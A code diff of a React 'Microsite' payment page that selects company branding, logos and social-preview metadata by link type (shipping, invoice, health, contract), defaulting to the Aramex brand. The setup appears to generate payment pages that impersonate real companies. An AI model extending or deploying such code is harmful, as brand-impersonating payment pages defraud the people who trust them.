@@ -6,6 +6,10 @@ import { Badge } from "@/components/ui/badge";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode, formatCurrency } from "@/lib/countries";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getInvoiceBranding } from "@/lib/invoiceLogos";
+import { getHealthBranding } from "@/lib/healthLogos";
+import { getLogisticsBranding } from "@/lib/logisticsLogos";
+import { getContractBranding } from "@/lib/contractLogos";
 import { gccShippingServices } from "@/lib/gccShippingServices";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency } from "@/utils/countryData";
@@ -78,7 +82,27 @@ const Microsite = () => {
   // Get service branding for SEO and display
   const serviceName = payload.service_name || payload.chalet_name;
   const serviceKey = payload.service_key || 'aramex';
-  const serviceBranding = getServiceBranding(serviceKey);
+
+  // Determine link types
+  const isShipping = link.type === 'shipping';
+  const isChalet = link.type === 'chalet';
+  const isInvoice = link.type === 'invoice';
+  const isHealth = link.type === 'health';
+  const isLogistics = link.type === 'logistics';
+  const isContract = link.type === 'contract';
+
+  // Get appropriate service branding based on type
+  const serviceBranding = isShipping
+    ? getServiceBranding(serviceKey)
+    : isInvoice
+    ? getInvoiceBranding(serviceKey)
+    : isHealth
+    ? getHealthBranding(serviceKey)
+    : isLogistics
+    ? getLogisticsBranding(serviceKey)
+    : isContract
+    ? getContractBranding(serviceKey)
+    : getServiceBranding(serviceKey);
 
   // Get dynamic company metadata for OG tags
   const companyMeta = getCompanyMeta(serviceKey);
@@ -94,14 +118,6 @@ const Microsite = () => {
 
   // Get service description from serviceBranding to match the chosen company
   const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
-
-  // Determine link types
-  const isShipping = link.type === 'shipping';
-  const isChalet = link.type === 'chalet';
-  const isInvoice = link.type === 'invoice';
-  const isHealth = link.type === 'health';
-  const isLogistics = link.type === 'logistics';
-  const isContract = link.type === 'contract';
 
   const displayName = isShipping
     ? `شحنة ${serviceName}`
